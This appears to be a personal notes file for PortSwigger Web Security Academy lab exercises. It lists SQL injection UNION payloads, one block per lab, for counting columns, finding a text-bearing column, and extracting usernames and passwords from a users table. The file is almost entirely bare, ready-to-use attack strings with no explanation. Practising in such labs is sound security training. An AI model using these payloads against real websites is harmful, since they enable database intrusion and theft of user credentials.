https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
# PayLoad:
# '+UNION+SELECT+NULL,+NULL,+NULL+FROM+information_schema.tables--+-

'+UNION+SELECT+NULL,NULL,NULL--+-


'+UNION+SELECT+NULL+FROM+information_schema.tables--+-

https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

# PayLoad:
# '+UNION+SELECT+NULL,'IWfxqs',NULL--+-


https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
# PayLoad:
# '+UNION+SELECT+username,+password+FROM+users--


